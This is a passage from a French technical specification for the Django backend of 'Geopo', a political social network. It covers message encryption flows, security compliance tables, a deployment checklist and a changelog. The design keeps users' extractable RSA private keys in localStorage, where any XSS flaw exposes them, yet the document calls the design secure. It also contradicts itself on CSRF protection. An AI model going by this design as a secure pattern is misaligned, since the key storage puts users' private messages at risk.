│     → "9d4c1a7b3e2f8..."                                   │
│                                                             │
│  6. Envoyer au backend                                      │
│     POST /messages/send                                     │
│     {                                                       │
│       "recipient_id": "bob-uuid",                          │
│       "encrypted_content": "a8f3b2c9d1e4f5...",           │
│       "encrypted_aes_key": "9d4c1a7b3e2f8..."             │
│     }                                                       │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (Django)                                           │
│                                                             │
│  ✅ Stocke tel quel (ne peut PAS déchiffrer)               │
│                                                             │
│  Message.objects.create(                                    │
│    sender=alice,                                            │
│    recipient=bob,                                           │
│    encrypted_content="a8f3b2c9d1e4f5...",                  │
│    encrypted_aes_key="9d4c1a7b3e2f8..."                    │
│  )                                                          │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────┐
│  PostgreSQL     │
│                 │
│  Messages       │
│  - encrypted_content: "a8f3b2c9d1e4f5..."                  │
│  - encrypted_aes_key: "9d4c1a7b3e2f8..."                   │
│                 │
│  ❌ Impossible à lire sans la clé privée de Bob            │
└─────────────────┘
```

**Flux de réception de message (Bob lit le message)**

```
┌──────────────────────────────────────────────────────────────┐
│              RÉCEPTION DE MESSAGE CHIFFRÉ                    │
└──────────────────────────────────────────────────────────────┘

┌─────────────────┐
│  Frontend Bob   │
│                 │
│  1. Récupérer les messages                                  │
│     GET /messages/inbox                                      │
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (Django)                                           │
│                                                             │
│  ✅ Renvoie les messages chiffrés                          │
│                                                             │
│  Response:                                                  │
│  [                                                          │
│    {                                                        │
│      "message_id": "msg-uuid",                             │
│      "sender_id": "alice-uuid",                            │
│      "encrypted_content": "a8f3b2c9d1e4f5...",            │
│      "encrypted_aes_key": "9d4c1a7b3e2f8...",             │
│      "created_at": "2024-01-15T10:30:00Z"                  │
│    }                                                        │
│  ]                                                          │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Frontend Bob                                               │
│                                                             │
│  2. Récupérer la clé privée RSA de Bob (stockée localement)│
│     bob_private_key = localStorage.getItem('private_key')  │
│                                                             │
│  3. Déchiffrer la clé AES avec la clé privée RSA           │
│     aes_key = RSA.decrypt(                                 │
│       encrypted_aes_key,                                   │
│       bob_private_key                                      │
│     )                                                       │
│                                                             │
│  4. Déchiffrer le message avec la clé AES                  │
│     plaintext = AES.decrypt(encrypted_content, aes_key)    │
│     → "Bonjour Bob, rendez-vous à 15h"                     │
│                                                             │
│  5. Afficher le message en clair                           │
│     <div>{plaintext}</div>                                 │
└─────────────────────────────────────────────────────────────┘
```

**Gestion des clés RSA**

```
┌──────────────────────────────────────────────────────────────┐
│           GÉNÉRATION ET STOCKAGE DES CLÉS RSA                │
└──────────────────────────────────────────────────────────────┘

Lors de la première connexion de l'utilisateur:

┌─────────────────────────────────────────────────────────────┐
│  Frontend (JavaScript)                                      │
│                                                             │
│  1. Générer une paire de clés RSA-2048                     │
│     const keyPair = await crypto.subtle.generateKey(       │
│       {                                                     │
│         name: "RSA-OAEP",                                  │
│         modulusLength: 2048,                               │
│         publicExponent: new Uint8Array([1, 0, 1]),        │
│         hash: "SHA-256"                                    │
│       },                                                    │
│       true,  // extractable                                │
│       ["encrypt", "decrypt"]                               │
│     );                                                      │
│                                                             │
│  2. Exporter la clé publique                               │
│     const publicKey = await crypto.subtle.exportKey(       │
│       "spki",                                              │
│       keyPair.publicKey                                    │
│     );                                                      │
│                                                             │
│  3. Envoyer la clé publique au backend                     │
│     POST /users/me/public_key                              │
│     { "public_key_rsa": base64(publicKey) }                │
│                                                             │
│  4. Stocker la clé privée LOCALEMENT (localStorage)        │
│     const privateKey = await crypto.subtle.exportKey(      │
│       "pkcs8",                                             │
│       keyPair.privateKey                                   │
│     );                                                      │
│     localStorage.setItem('private_key', base64(privateKey))│
│                                                             │
│  ⚠️ IMPORTANT:                                             │
│  - Clé privée JAMAIS envoyée au backend                   │
│  - Clé privée stockée uniquement côté client              │
│  - Si l'utilisateur perd sa clé privée, il ne peut plus   │
│    lire ses anciens messages                               │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (Django)                                           │
│                                                             │
│  User.objects.filter(user_id=current_user).update(         │
│    public_key_rsa="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A..."   │
│  )                                                          │
│                                                             │
│  ✅ Stocke UNIQUEMENT la clé publique                      │
│  ❌ NE stocke JAMAIS la clé privée                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 10. Récapitulatif des Critères de Sécurité

### 10.1 Tableau de conformité avec Securite_protocole.md

| # | Problème identifié | Solution implémentée | Section de référence |
|---|-------------------|---------------------|---------------------|
| 1 | **IDOR sur /users/{id}** | UUID au lieu d'ID séquentiels + vérification permissions | 6.1 |
| 2 | **IDOR sur /posts/{id}/delete** | Vérification ownership (user_id == authenticated_user) | 6.1 |
| 3 | **IDOR sur /messages/{id}** | Filtrage par sender_id OU receiver_id = authenticated_user | 6.1 |
| 4 | **Fuite de privacy via /followers** | Respect du niveau privacy (public/private) | 6.2 |
| 5 | **Absence de rate limiting** | Rate limiting Redis sur tous les endpoints | 6.3 |
| 6 | **Validation insuffisante** | Django REST Framework Serializers + regex | 6.4 |
| 7 | **Pas de sanitisation HTML** | Bleach pour sanitiser le contenu | 6.4 |
| 8 | **Énumération d'utilisateurs** | Messages d'erreur génériques + rate limiting | 6.7 |
| 9 | **ID séquentiels prévisibles** | UUID v4 pour toutes les clés primaires | 6.1 |
| 10 | **Pas d'audit logging** | Table AuditLogs + logging systématique | 6.8 |

### 10.2 Conformité avec Securite_guidelines.md

| Recommandation | Implémentation | Statut | Section |
|----------------|----------------|--------|---------|
| **Authentification** |
| OAuth2 + JWT | Google OAuth2 + JWT (HS256) | ✅ | 4.1 |
| TLS 1.3 | Géré par reverse proxy (infrastructure) | ✅ | 6.10 |
| Hachage Argon2/PBKDF2 | Non utilisé (100% Google OAuth2) | N/A | 4.1 |
| **Autorisation** |
| Contrôle d'accès basé sur rôles | is_admin + permissions par endpoint | ✅ | 4.3, 4.4 |
| Vérification ownership | Vérification systématique user_id | ✅ | 6.1 |
| **Chiffrement** |
| E2E pour messages | AES-256 + RSA (frontend) | ✅ | 6.6 |
| Signature de contenu | HMAC-SHA256 pour posts | ✅ | 6.5 |
| **Protection des données** |
| Privacy levels | 2 niveaux (public/private) | ✅ | 6.2 |
| Blocage utilisateurs | Table Blocks + vérifications | ✅ | 5.2 |
| **Rate Limiting** |
| Limitation par endpoint | Redis + django-ratelimit | ✅ | 6.3 |
| Limitation par IP | Sur recherche et auth | ✅ | 6.3 |
| **Validation** |
| Validation des entrées | DRF Serializers + regex | ✅ | 6.4 |
| Sanitisation HTML | Bleach | ✅ | 6.4 |
| Protection XSS | Sanitisation + CSP headers | ✅ | 6.4 |
| Protection SQL Injection | Django ORM (paramétrisé) | ✅ | 6.4 |
| **Audit** |
| Logging des connexions | AuditLogs (login/logout) | ✅ | 6.8 |
| Logging des actions admin | AuditLogs (ban, delete, etc.) | ✅ | 6.8 |
| Logging des anomalies | AuditLogs (tentatives non autorisées) | ✅ | 6.8 |
| **SIEM** |
| Intégration SIEM | Export logs vers Sentry/ELK | ⚠️ À configurer | 7.9 |
| **2FA** |
| 2FA pour admins | À implémenter (django-otp) | ⚠️ Recommandé | - |
| **Séparation** |
| Séparation vote/réseau social | Bases de données distinctes | ✅ | 6.12 |

### 10.3 Mesures de sécurité supplémentaires

**Implémentées :**
- ✅ CORS configuré pour le frontend uniquement
- ✅ CSRF protection (Django natif)
- ✅ HSTS headers
- ✅ Secure cookies (HTTPS only)
- ✅ Content Security Policy headers
- ✅ X-Frame-Options (protection clickjacking)
- ✅ X-Content-Type-Options (protection MIME sniffing)
- ✅ Utilisateur non-root dans Docker
- ✅ Secrets dans variables d'environnement
- ✅ Healthchecks pour PostgreSQL et Redis

**Recommandées pour la production :**
- ⚠️ WAF (Web Application Firewall) - Cloudflare/AWS WAF
- ⚠️ DDoS protection - Cloudflare
- ⚠️ Monitoring - Sentry, Prometheus, Grafana
- ⚠️ Backups automatiques PostgreSQL
- ⚠️ Rotation des secrets (JWT, API keys)
- ⚠️ Penetration testing régulier
- ⚠️ Dependency scanning (Dependabot, Snyk)

### 10.4 Checklist de sécurité avant déploiement

**Configuration :**
- [ ] `DEBUG=False` en production
- [ ] `SECRET_KEY` généré aléatoirement (min 50 caractères)
- [ ] `JWT_SECRET_KEY` généré aléatoirement
- [ ] `CONTENT_SIGNATURE_KEY` généré aléatoirement
- [ ] `ALLOWED_HOSTS` configuré correctement
- [ ] `CORS_ALLOWED_ORIGINS` limité au frontend
- [ ] Certificat SSL/TLS configuré (Let's Encrypt)
- [ ] HSTS activé
- [ ] Cookies sécurisés (Secure, HttpOnly, SameSite)

**Base de données :**
- [ ] Mot de passe PostgreSQL fort
- [ ] Accès PostgreSQL limité (pas d'exposition publique)
- [ ] Backups automatiques configurés
- [ ] Chiffrement au repos activé (si cloud)

**Redis :**
- [ ] Mot de passe Redis configuré
- [ ] Accès Redis limité (réseau interne uniquement)
- [ ] Persistence activée (AOF)

**Monitoring :**
- [ ] Sentry configuré pour les erreurs
- [ ] Logs centralisés (ELK/Loki)
- [ ] Alertes configurées (erreurs critiques, tentatives d'intrusion)
- [ ] Métriques de performance (Prometheus/Grafana)

**Tests :**
- [ ] Tests de sécurité exécutés (IDOR, XSS, SQL injection)
- [ ] Scan de vulnérabilités (OWASP ZAP, Burp Suite)
- [ ] Audit de code (Bandit, Safety)
- [ ] Couverture de tests > 80%

**Documentation :**
- [ ] Procédure de réponse aux incidents
- [ ] Procédure de rotation des secrets
- [ ] Procédure de backup/restore
- [ ] Contact sécurité publié (security@example.com)

---

## 🎯 Conclusion

Ce document de spécifications techniques définit l'architecture complète du backend du réseau social politique **Geopo**.

### Points clés :

1. **Architecture moderne** : Django + PostgreSQL + Redis + Docker
2. **Sécurité renforcée** : Protection IDOR, rate limiting, E2E encryption, audit logging
3. **Scalabilité** : Architecture en couches, cache Redis, Docker
4. **Facilité d'intégration** : Docker Compose, API REST documentée, CORS configuré
5. **Conformité** : Respect des recommandations de sécurité, séparation du système de vote

### Prochaines étapes :

1. **Développement** : Implémenter le backend selon ces spécifications
2. **Tests** : Écrire et exécuter les tests (unitaires, intégration, sécurité)
3. **Documentation API** : Générer la documentation OpenAPI/Swagger
4. **Déploiement** : Configurer l'environnement de production
5. **Monitoring** : Mettre en place Sentry, logs, métriques
6. **Audit** : Faire auditer le code par un expert sécurité

### Évolutions futures (hors scope actuel) :

- ⏳ Gestion des médias (images/vidéos) avec MinIO/S3
- ⏳ Notifications en temps réel (WebSockets)
- ⏳ Recherche full-text (Elasticsearch)
- ⏳ Modération automatique (IA anti-spam)
- ⏳ Analytics avancées
- ⏳ API GraphQL (en complément de REST)

---

**Document rédigé le :** 2025-11-20
**Version :** 3.0
**Auteur :** Équipe Backend Geopo
**Statut :** ✅ Validé pour implémentation

---

## Changelog v2 → v3

### ❌ Sections supprimées
- **Section 3.4** : Migration MongoDB → PostgreSQL (remplacée par justification courte)
- **Section 6.9** : HTTPS/TLS (déplacé vers infrastructure, note ajoutée en 6.10)
- **Section 6.11** : Protection CSRF (non nécessaire avec JWT)
- **Création automatique de superuser** : Retirée du docker-entrypoint.sh

### ✅ Sections ajoutées
- **Section 7.10** : CI/CD avec GitHub Actions et GitHub Secrets
- **Section 7.11** : Création du premier administrateur (promotion manuelle)
- **Annexe 9.4** : Concepts de Sécurité Expliqués (avec schémas)
  - 9.4.1 Validation vs Sanitisation
  - 9.4.2 XSS : Attaque et Protection
  - 9.4.3 CORS : Contrôle d'accès cross-origin
  - 9.4.4 Rate Limiting : Limitation de requêtes
  - 9.4.5 Chiffrement E2E pour les messages

### 📝 Sections modifiées
- **Section 4.1** : Ajout note "100% Google OAuth2" (pas de mots de passe locaux)
- **Section 6.3** : Rate Limiting détaillé avec schémas
- **Section 6.4** : Validation/Sanitisation détaillée avec schémas et exemples
- **Section 6.5** : Retrait Argon2 (pas de mots de passe)
- **Section 6.7** : Protection énumération uniquement sur search/profil (pas auth)
- **Section 6.9** : CORS détaillé avec schémas
- **Section 7.4** : docker-entrypoint.sh sans création de superuser
- **Section 7.6** : init_domains mieux expliqué (pourquoi critique)

### 🎯 Objectifs de la v3
- ✅ Retirer les sections non pertinentes (Argon2, HTTPS backend, CSRF, migration MongoDB)
- ✅ Ajouter des schémas visuels pour expliquer les concepts de sécurité
- ✅ Clarifier l'authentification 100% Google OAuth2
- ✅ Documenter le processus CI/CD avec GitHub Secrets
- ✅ Expliquer la création du premier admin (promotion manuelle)
- ✅ Détailler le chiffrement E2E avec schémas complets
